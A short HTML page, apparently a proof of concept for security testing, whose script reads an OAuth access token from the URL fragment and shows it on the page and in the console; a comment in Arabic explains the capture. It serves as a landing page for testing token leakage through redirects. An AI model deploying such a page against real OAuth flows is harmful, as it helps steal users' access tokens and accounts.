<!DOCTYPE html>
<html>
<head>
    <title>Security Research - Access Token Capture</title>
</head>
<body>
    <h1>Security Test in Progress</h1>
    <p id="token-display">Waiting for response...</p>

    <script>
        // هذا الكود يسحب التوكن من رابط العنوان (URL Fragment)
        const hash = window.location.hash;
        if (hash.includes('access_token')) {
            document.getElementById('token-display').innerText = "Captured Token: " + hash;
            console.log("Full Hash Captured:", hash);
        }
    </script>
</body>
</html>
